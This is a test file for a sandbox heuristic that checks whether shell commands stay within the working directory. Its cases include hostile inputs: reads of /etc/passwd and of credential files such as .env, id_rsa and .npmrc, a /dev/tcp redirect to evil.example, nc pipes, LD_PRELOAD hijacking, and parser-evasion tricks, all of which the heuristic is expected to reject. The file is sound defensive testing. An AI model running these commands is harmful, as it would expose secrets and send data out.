import { describe, it, expect, beforeAll, afterAll } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { getCwdConfinementPermission } from "../../sandbox/heuristics";
import type { SandboxConfigCwdConfinement } from "../../common/config";

const CWD = "/project";

interface HeuristicTest {
    desc: string;
    command: string;
    config?: SandboxConfigCwdConfinement;
    expected: "allow:sandbox" | "allow" | undefined;
}

const runTests = (tests: HeuristicTest[]) => {
    it.each(tests)("$desc", (test) => {
        expect(getCwdConfinementPermission(test.command, CWD, test.config ?? {})).toBe(
            test.expected,
        );
    });
};

describe("getCwdConfinementPermission", () => {
    describe("known commands within cwd", () => {
        runTests([
            { desc: "relative path", command: "cat file.txt", expected: "allow:sandbox" },
            { desc: "absolute path inside cwd", command: "cat /project/file.txt", expected: "allow:sandbox" },
            { desc: "nested relative path", command: "cat src/index.ts", expected: "allow:sandbox" },
            { desc: "dot path", command: "ls ./src", expected: "allow:sandbox" },
            { desc: "no arguments (reads stdin/cwd)", command: "cat", expected: "allow:sandbox" },
            { desc: "flags only", command: "ls -la", expected: "allow:sandbox" },
            { desc: "cwd itself", command: "ls /project", expected: "allow:sandbox" },
            { desc: "path with .. staying inside", command: "cat src/../README.md", expected: "allow:sandbox" },
            { desc: "multiple files", command: "cat a.txt b.txt c.txt", expected: "allow:sandbox" },
            { desc: "value flag consumed", command: "head -n 5 file.txt", expected: "allow:sandbox" },
            { desc: "value flag inline (short)", command: "head -n5 file.txt", expected: "allow:sandbox" },
            { desc: "value flag inline (long)", command: "head --lines=5 file.txt", expected: "allow:sandbox" },
            { desc: "double dash separator", command: "cat -- -weird-name", expected: "allow:sandbox" },
            { desc: "lone dash (stdin)", command: "cat -", expected: "allow:sandbox" },
            { desc: "no positional args command", command: "pwd", expected: "allow:sandbox" },
            { desc: "ignore positionals command", command: "echo hello world", expected: "allow:sandbox" },
            { desc: "env assignment prefix", command: "FOO=bar cat file.txt", expected: "allow:sandbox" },
            { desc: "quoted path", command: 'cat "my file.txt"', expected: "allow:sandbox" },
        ]);
    });

    describe("paths outside cwd fall back", () => {
        runTests([
            { desc: "absolute path outside", command: "cat /etc/passwd", expected: undefined },
            { desc: "parent traversal escape", command: "cat ../outside.txt", expected: undefined },
            { desc: "home path outside cwd", command: "cat ~/secrets.txt", expected: undefined },
            { desc: "ls outside dir", command: "ls /tmp", expected: undefined },
            { desc: "flag path value outside", command: "sort -o /tmp/out.txt file.txt", expected: undefined },
            { desc: "unknown long flag with path value", command: "ls --foo=/etc/passwd", expected: undefined },
            { desc: "path flag value outside (inline)", command: "sort --output=/tmp/out file", expected: undefined },
        ]);
    });

    describe("unknown commands fall back", () => {
        runTests([
            { desc: "unknown command", command: "npm install", expected: undefined },
            { desc: "unknown command with in-cwd path", command: "curl ./file.txt", expected: undefined },
            { desc: "command invoked by absolute path", command: "/tmp/evil/cat file.txt", expected: undefined },
            { desc: "command invoked by relative path", command: "./cat file.txt", expected: undefined },
            { desc: "empty command", command: "", expected: undefined },
            { desc: "whitespace command", command: "   ", expected: undefined },
            { desc: "only env assignment", command: "FOO=bar", expected: undefined },
            { desc: "positionals on no-positional command", command: "pwd /project", expected: undefined },
        ]);
    });

    describe("chained and multi-line commands", () => {
        runTests([
            { desc: "pipe of known commands", command: "cat file.txt | grep foo", expected: "allow:sandbox" },
            { desc: "chain with &&", command: "ls src && cat src/index.ts", expected: "allow:sandbox" },
            { desc: "multi-line known commands", command: "cat a.txt\nls b.txt", expected: "allow:sandbox" },
            { desc: "chain with unknown command", command: "cat file.txt && rm -rf x", expected: undefined },
            { desc: "pipe with unknown command", command: "cat file.txt | nc host 80", expected: undefined },
            { desc: "second command escapes cwd", command: "cat a.txt\ncat /etc/passwd", expected: undefined },
        ]);
    });

    describe("redirections", () => {
        runTests([
            { desc: "write within cwd", command: "cat a.txt > b.txt", expected: "allow:sandbox" },
            { desc: "append within cwd", command: "echo hello >> log.txt", expected: "allow:sandbox" },
            { desc: "stderr to /dev/null", command: "ls src 2>/dev/null", expected: "allow:sandbox" },
            { desc: "read from within cwd", command: "wc -l < file.txt", expected: "allow:sandbox" },
            { desc: "write outside cwd", command: "cat a.txt > /tmp/out.txt", expected: undefined },
            { desc: "stderr outside cwd", command: "ls 2> /tmp/err.txt", expected: undefined },
            { desc: "read from outside cwd", command: "wc -l < /etc/passwd", expected: undefined },
        ]);
    });

    describe("grep pattern handling", () => {
        runTests([
            { desc: "pattern skipped, no paths", command: "grep foo file.txt", expected: "allow:sandbox" },
            { desc: "pattern with slash skipped", command: "grep foo/bar file.txt", expected: "allow:sandbox" },
            { desc: "recursive within cwd", command: "grep -rn foo ./src", expected: "allow:sandbox" },
            { desc: "path outside as file arg", command: "grep foo /etc/passwd", expected: undefined },
            { desc: "-e makes all positionals paths", command: "grep -e foo /etc/passwd", expected: undefined },
            { desc: "-e with contained paths", command: "grep -e foo a.txt b.txt", expected: "allow:sandbox" },
            { desc: "inline -e (short) makes positionals paths", command: "grep -efoo /etc/passwd", expected: undefined },
            { desc: "--regexp makes positionals paths", command: "grep --regexp foo /etc/passwd", expected: undefined },
            { desc: "--regexp= inline", command: "grep --regexp=foo /etc/passwd", expected: undefined },
            { desc: "-f pattern file inside cwd", command: "grep -f patterns.txt file.txt", expected: "allow:sandbox" },
            { desc: "-f pattern file outside cwd", command: "grep -f /etc/patterns file.txt", expected: undefined },
        ]);
    });

    describe("find safety", () => {
        runTests([
            { desc: "simple find within cwd", command: "find . -name foo", expected: "allow:sandbox" },
            { desc: "find with path", command: "find src -type f", expected: "allow:sandbox" },
            { desc: "find outside cwd", command: "find /etc -name foo", expected: undefined },
            { desc: "find -delete is unsafe", command: "find . -name foo -delete", expected: undefined },
            { desc: "find -exec is unsafe", command: "find . -exec rm {} \\;", expected: undefined },
            { desc: "find -execdir is unsafe", command: "find . -execdir echo {} +", expected: undefined },
            { desc: "find -fprintf is unsafe", command: "find . -fprintf out.txt %p", expected: undefined },
        ]);
    });

    describe("subshells and process substitution", () => {
        runTests([
            { desc: "subshell with known command", command: "cat $(echo file.txt)", expected: "allow:sandbox" },
            { desc: "backtick subshell", command: "cat `echo file.txt`", expected: "allow:sandbox" },
            { desc: "subshell with unknown command", command: "cat $(curl example.com)", expected: undefined },
            { desc: "subshell escaping cwd", command: "cat $(cat /etc/passwd)", expected: undefined },
            { desc: "nested subshells", command: "cat $(echo $(echo file.txt))", expected: "allow:sandbox" },
            { desc: "process substitution known", command: "cat <(echo hi)", expected: "allow:sandbox" },
            { desc: "process substitution unknown", command: "cat <(curl example.com)", expected: undefined },
            { desc: "redirection into process substitution", command: "echo hi > >(cat)", expected: "allow:sandbox" },
            { desc: "redirection into unknown process substitution", command: "echo hi > >(nc host 80)", expected: undefined },
        ]);
    });

    describe("heredocs", () => {
        runTests([
            { desc: "heredoc within cwd", command: "cat << EOF\nhello\nEOF", expected: "allow:sandbox" },
            { desc: "heredoc with path arg", command: "grep foo << EOF\nhello\nEOF", expected: "allow:sandbox" },
        ]);
    });

    describe("parser evasion resistance", () => {
        runTests([
            { desc: "quoted known command name behaves like bash", command: '"cat" file.txt', expected: "allow:sandbox" },
            { desc: "quoted unknown command name", command: '"nc" host 80', expected: undefined },
            { desc: "tab as argument separator", command: "cat\tfile.txt", expected: "allow:sandbox" },
            { desc: "escaped char in command name resolves like bash", command: "c\\at file.txt", expected: "allow:sandbox" },
            { desc: "escaped char does not disguise unknown command", command: "n\\c host 80", expected: undefined },
            { desc: "case-sensitive command names", command: "CAT file.txt", expected: undefined },
            { desc: "empty quotes prefix", command: '""cat file.txt', expected: "allow:sandbox" },
            { desc: "bash -c is not a known command", command: 'bash -c "cat file.txt"', expected: undefined },
            { desc: "sh -c is not a known command", command: "sh -c 'cat file.txt'", expected: undefined },
            { desc: "eval is not a known command", command: "eval cat file.txt", expected: undefined },
            { desc: "env wrapper is not a known command", command: "env cat file.txt", expected: undefined },
            { desc: "command builtin is not a known command", command: "command cat file.txt", expected: undefined },
            { desc: "xargs is not a known command", command: "xargs cat < files.txt", expected: undefined },
            { desc: "sudo is not a known command", command: "sudo cat file.txt", expected: undefined },
            { desc: "time is not a known command", command: "time cat file.txt", expected: undefined },
        ]);
    });

    describe("environment assignments", () => {
        runTests([
            { desc: "benign assignment", command: "FOO=bar cat file.txt", expected: "allow:sandbox" },
            { desc: "multiple benign assignments", command: "FOO=bar BAZ=qux cat file.txt", expected: "allow:sandbox" },
            { desc: "empty assignment value", command: "FOO= cat file.txt", expected: "allow:sandbox" },
            { desc: "LD_PRELOAD is rejected", command: "LD_PRELOAD=/tmp/evil.so cat file.txt", expected: undefined },
            { desc: "LD_LIBRARY_PATH is rejected", command: "LD_LIBRARY_PATH=/tmp cat file.txt", expected: undefined },
            { desc: "PATH assignment is rejected", command: "PATH=/tmp/evil cat file.txt", expected: undefined },
            { desc: "BASH_ENV is rejected", command: "BASH_ENV=/tmp/x cat file.txt", expected: undefined },
            { desc: "IFS is rejected", command: "IFS=x cat file.txt", expected: undefined },
            { desc: "assignment value outside cwd is path-checked", command: "FOO=/etc/passwd cat file.txt", expected: undefined },
            { desc: "assignment value in home is path-checked", command: "FOO=~/x cat file.txt", expected: undefined },
            { desc: "sensitive assignment value is rejected", command: "FOO=.env cat file.txt", expected: undefined },
        ]);
    });

    describe("redirection edge cases", () => {
        runTests([
            { desc: "stderr merged into stdout", command: "cat file.txt 2>&1", expected: "allow:sandbox" },
            { desc: "stdout to /dev/stdout", command: "echo hello > /dev/stdout", expected: "allow:sandbox" },
            { desc: "bash network redirect is outside cwd", command: "echo hello > /dev/tcp/evil.example/80", expected: undefined },
            { desc: ">&2 is conservatively rejected", command: "cat file.txt >&2", expected: undefined },
            { desc: "1>&2 is conservatively rejected", command: "cat file.txt 1>&2", expected: undefined },
        ]);
    });

    describe("unsafe flag variants", () => {
        runTests([
            { desc: "sort --compress-program with separate arg", command: "sort --compress-program /tmp/x file.txt", expected: undefined },
            { desc: "sort --compress-program= inline", command: "sort --compress-program=/tmp/x file.txt", expected: undefined },
            { desc: "find -ok prompts per match, still unsafe", command: "find . -ok rm {} \\;", expected: undefined },
            { desc: "grep --dereference-recursive long form", command: "grep --dereference-recursive foo .", expected: undefined },
            { desc: "grep -r without dereference is allowed", command: "grep -r foo .", expected: "allow:sandbox" },
            { desc: "sort with safe flags stays allowed", command: "sort -n -k 2 file.txt", expected: "allow:sandbox" },
        ]);
    });

    describe("chain edge cases", () => {
        runTests([
            { desc: "trailing chain operator", command: "cat file.txt &&", expected: "allow:sandbox" },
            { desc: "only chain operators", command: "; ; ;", expected: undefined },
            { desc: "background operator", command: "cat file.txt &", expected: "allow:sandbox" },
            { desc: "background unknown command", command: "sleep 100 &", expected: undefined },
            { desc: "second branch escapes cwd", command: "cat file.txt || cat /etc/passwd", expected: undefined },
        ]);
    });

    describe("sensitive paths", () => {
        runTests([
            { desc: ".env file", command: "cat .env", expected: undefined },
            { desc: ".env variant", command: "cat .env.local", expected: undefined },
            { desc: ".env in subdirectory", command: "cat src/.env", expected: undefined },
            { desc: ".env via parent traversal", command: "cat src/../.env", expected: undefined },
            { desc: ".git config", command: "cat .git/config", expected: undefined },
            { desc: ".git dir listing", command: "ls .git", expected: undefined },
            { desc: "ssh dir", command: "cat .ssh/config", expected: undefined },
            { desc: "aws dir", command: "ls .aws", expected: undefined },
            { desc: "npmrc", command: "cat .npmrc", expected: undefined },
            { desc: "netrc", command: "cat .netrc", expected: undefined },
            { desc: "private key by name", command: "cat id_rsa", expected: undefined },
            { desc: "private key by extension", command: "cat keys/server.pem", expected: undefined },
            { desc: "key extension", command: "cat tls.key", expected: undefined },
            { desc: "p12 bundle", command: "cat cert.p12", expected: undefined },
            { desc: "tfvars", command: "cat prod.tfvars", expected: undefined },
            { desc: "credentials file", command: "cat credentials", expected: undefined },
            { desc: "redirect into sensitive file", command: "echo x > .env", expected: undefined },
            { desc: "glob arg touching nothing sensitive", command: "cat src/*", expected: "allow:sandbox" },
            { desc: ".gitignore is not sensitive", command: "cat .gitignore", expected: "allow:sandbox" },
            { desc: ".github dir is not sensitive", command: "ls .github", expected: "allow:sandbox" },
            { desc: "regular config file is not sensitive", command: "cat config/database.yml", expected: "allow:sandbox" },
            { desc: "file containing 'key' is not sensitive", command: "cat monkey.txt", expected: "allow:sandbox" },
            {
                desc: "blockDotfiles rejects dotfiles",
                command: "cat .gitignore",
                config: { blockDotfiles: true },
                expected: undefined,
            },
            {
                desc: "blockDotfiles still allows regular files",
                command: "cat file.txt",
                config: { blockDotfiles: true },
                expected: "allow:sandbox",
            },
            {
                desc: "custom denyPaths pattern",
                command: "cat data/db.sqlite",
                config: { denyPaths: ["*.sqlite"] },
                expected: undefined,
            },
            {
                desc: "custom denyPaths pattern, unaffected file",
                command: "cat data/db.txt",
                config: { denyPaths: ["*.sqlite"] },
                expected: "allow:sandbox",
            },
            {
                desc: "grep pattern slot does not trigger sensitive check",
                command: "grep .env file.txt",
                expected: "allow:sandbox",
            },
        ]);
    });

    describe("symlink handling (real filesystem)", () => {
        let dir: string;
        let aliasDir: string;

        beforeAll(() => {
            dir = fs.mkdtempSync(path.join(os.tmpdir(), "pi-sandbox-heuristics-"));

            fs.mkdirSync(path.join(dir, "realdir"));
            fs.writeFileSync(path.join(dir, "realdir", "inside.txt"), "x");
            fs.writeFileSync(path.join(dir, "plain.txt"), "x");

            // link-inside.txt -> realdir/inside.txt (stays within cwd)
            fs.symlinkSync(path.join("realdir", "inside.txt"), path.join(dir, "link-inside.txt"));
            // link-outside.txt -> /etc/hostname (escapes cwd)
            fs.symlinkSync("/etc/hostname", path.join(dir, "link-outside.txt"));
            // chain: link-chain-src.txt -> link-chain.txt -> /etc/hostname
            fs.symlinkSync("/etc/hostname", path.join(dir, "link-chain.txt"));
            fs.symlinkSync("link-chain.txt", path.join(dir, "link-chain-src.txt"));
            // directory symlinks
            fs.symlinkSync("realdir", path.join(dir, "dirlink-inside"));
            fs.symlinkSync("/etc", path.join(dir, "dirlink-outside"));
            // symlink with innocent name pointing at sensitive file
            fs.writeFileSync(path.join(dir, ".env"), "SECRET=x");
            fs.symlinkSync(".env", path.join(dir, "env-link.txt"));
            // symlink with innocent name pointing at sensitive directory
            fs.mkdirSync(path.join(dir, ".ssh"));
            fs.writeFileSync(path.join(dir, ".ssh", "id_rsa"), "KEY");
            fs.symlinkSync(path.join(".ssh", "id_rsa"), path.join(dir, "notes.txt"));
            // symlink pointing at the working directory itself
            aliasDir = path.join(os.tmpdir(), `pi-sandbox-heuristics-alias-${path.basename(dir)}`);
            fs.symlinkSync(dir, aliasDir);

            // dangling symlink (target does not exist)
            fs.symlinkSync(path.join(dir, "nonexistent-target-xyz"), path.join(dir, "dangling.txt"));
        });

        afterAll(() => {
            fs.rmSync(dir, { recursive: true, force: true });
            fs.rmSync(aliasDir, { force: true });
        });

        const runFsTests = (tests: HeuristicTest[]) => {
            it.each(tests)("$desc", (test) => {
                expect(
                    getCwdConfinementPermission(test.command, dir, test.config ?? {}),
                ).toBe(test.expected);
            });
        };

        runFsTests([
            { desc: "symlink staying within cwd", command: "cat link-inside.txt", expected: "allow:sandbox" },
            { desc: "symlink escaping cwd", command: "cat link-outside.txt", expected: undefined },
            { desc: "symlink chain escaping cwd", command: "cat link-chain-src.txt", expected: undefined },
            { desc: "directory symlink within cwd", command: "ls dirlink-inside", expected: "allow:sandbox" },
            { desc: "file through inside directory symlink", command: "cat dirlink-inside/inside.txt", expected: "allow:sandbox" },
            { desc: "directory symlink escaping cwd", command: "ls dirlink-outside", expected: undefined },
            { desc: "file through outside directory symlink", command: "cat dirlink-outside/hostname", expected: undefined },
            { desc: "dangling symlink read is rejected", command: "cat dangling.txt", expected: undefined },
            { desc: "dangling symlink write is rejected", command: "echo x > dangling.txt", expected: undefined },
            { desc: "plain file", command: "cat plain.txt", expected: "allow:sandbox" },
            { desc: "new write target in existing cwd", command: "echo x > newfile.txt", expected: "allow:sandbox" },
            { desc: "new write target in new subdirectory", command: "echo x > newdir/file.txt", expected: "allow:sandbox" },
            { desc: "find follows symlinks with -L: falls back", command: "find . -L -name foo", expected: undefined },
            { desc: "find without -L stays allowed", command: "find . -name foo", expected: "allow:sandbox" },
            { desc: "symlink hiding a sensitive file is rejected", command: "cat env-link.txt", expected: undefined },
            { desc: "symlink hiding a sensitive directory target is rejected", command: "cat notes.txt", expected: undefined },
            { desc: "grep -R follows traversal symlinks: falls back", command: "grep -R foo .", expected: undefined },
            { desc: "grep -r does not follow traversal symlinks: allowed", command: "grep -r foo .", expected: "allow:sandbox" },
            { desc: "du -L follows symlinks: falls back", command: "du -L .", expected: undefined },
            { desc: "tree -l follows symlinks: falls back", command: "tree -l", expected: undefined },
            {
                desc: "resolveSymlinks: false disables the realpath check",
                command: "cat link-outside.txt",
                config: { resolveSymlinks: false },
                expected: "allow:sandbox",
            },
        ]);

        it("cwd reached through a symlink still works", () => {
            expect(getCwdConfinementPermission("cat plain.txt", aliasDir, {})).toBe("allow:sandbox");
            expect(getCwdConfinementPermission("cat /etc/hostname", aliasDir, {})).toBe(undefined);
        });
    });

    describe("configuration", () => {
        runTests([
            {
                desc: "disabled heuristic falls back",
                command: "cat file.txt",
                config: { enabled: false },
                expected: undefined,
            },
            {
                desc: "custom permission",
                command: "cat file.txt",
                config: { permission: "allow" },
                expected: "allow",
            },
            {
                desc: "commands allowlist permits listed command",
                command: "ls src",
                config: { commands: ["ls"] },
                expected: "allow:sandbox",
            },
            {
                desc: "commands allowlist rejects other known commands",
                command: "cat file.txt",
                config: { commands: ["ls"] },
                expected: undefined,
            },
            {
                desc: "outside cwd still falls back with custom permission",
                command: "cat /etc/passwd",
                config: { permission: "allow" },
                expected: undefined,
            },
        ]);
    });
});
